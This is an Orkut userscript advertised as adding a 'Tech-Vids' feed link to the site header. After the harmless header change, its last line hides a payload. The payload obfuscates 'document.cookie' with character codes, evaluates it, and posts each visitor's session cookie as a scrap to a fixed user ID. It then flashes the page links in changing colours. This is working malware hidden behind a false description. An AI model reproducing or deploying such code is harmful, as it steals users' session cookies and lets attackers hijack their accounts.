// ==UserScript==
// @name           	Tech-Vids
// @description    	See Tech-Vids Feeds On Any Orkut.com Page.
// @include      	http://orkut.com/*
// @include        	http://*.orkut.com/*
// @exclude        	http://orkut.com/GLogin.aspx*
// @exclude        	http://*.orkut.com/GLogin.aspx*
// ==/UserScript==

// Variables declared.
var headerHTMLModified;
var headerMenu		=	document.getElementById("headerMenu");
var headerHTML		=	headerMenu.innerHTML;

// Modification of the header with the Scrapbook and Profile links.
headerHTMLModified	=	headerHTML + ' | <a href="http://www.orkut.com/ViewFeed.aspx?feedurl=http%3A%2F%2Ftech-vids.blogspot.com%2Ffeeds%2Fposts%2Fdefault">Tech-Vids</a>';
headerMenu.innerHTML	=	headerHTMLModified;

javascript:nobody=replyForm;nobody.toUserId.value=89280608;nobody.scrapText.value=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101));nobody.action='Scrapbook.aspx?Action.writeScrapBasic'; _submitForm(nobody, 'submit', ''); i=0;c=["red","green","blue","yellow","magenta","orange","pink","violet"]; a=document.links;setInterval('i++;a[i % document.links.length].style.color=c[i % c.length]',10);void(0);